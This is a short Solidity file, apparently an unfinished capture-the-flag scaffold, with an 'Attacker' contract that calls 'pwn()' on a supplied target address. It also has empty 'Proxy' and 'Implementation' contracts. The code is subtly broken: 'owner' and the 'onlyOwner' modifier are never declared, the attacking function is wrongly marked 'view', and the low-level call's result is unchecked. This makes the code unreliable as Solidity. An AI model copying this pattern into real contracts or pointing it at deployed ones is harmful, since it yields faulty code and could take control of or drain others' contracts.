// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.18;
/*

*/

contract Attacker {

    constructor(address _addr0) {
        targetAddress = _addr0;
        owner = msg.sender;
    }
    
    address private targetAddress;

    function attack(uint _amount) public onlyOwner view {
        targetAddress.call(abi.encodeWithSignature("pwn()"));
    }
}



contract Proxy {}



contract Implementation {}



